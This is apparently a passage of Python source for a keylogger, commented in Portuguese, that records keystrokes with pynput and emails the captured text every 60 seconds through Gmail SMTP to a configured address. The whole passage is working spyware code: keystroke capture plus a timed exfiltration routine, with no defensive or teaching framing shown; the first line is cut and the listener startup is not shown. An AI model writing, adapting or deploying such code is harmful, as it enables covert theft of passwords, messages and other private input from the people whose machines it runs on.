rom pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# --- CONFIGURAÇÕES DO E-MAIL ---

EMAIL_ORIGEM = "examplekeylogger@gmail.com"
EMAIL_DESTINO = "examplekeylogger@gmail.com"
SENHA_EMAIL = "SUA_SENHA"

# Inicialização da variável global que guardará o texto
log = ""

def enviar_email():
    global log
   
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            # Conexão com o servidor 
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()  # Inicia criptografia para segurança
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
            
            # Limpa o log após enviar com sucesso para não repetir dados
            log = ""
        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")

    # Agenda o próximo envio para daqui a 60 segundos (Recursividade)
    timer = Timer(60, enviar_email)
    timer.start()

def on_press(key):
    global log
    try:
        # Tenta capturar letras, números e símbolos
        log += key.char
    except AttributeError:
        # Trata teclas especiais para manter o log legível
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]" 
        else:
            pass # Ignora Shift, Ctrl, Alt, etc.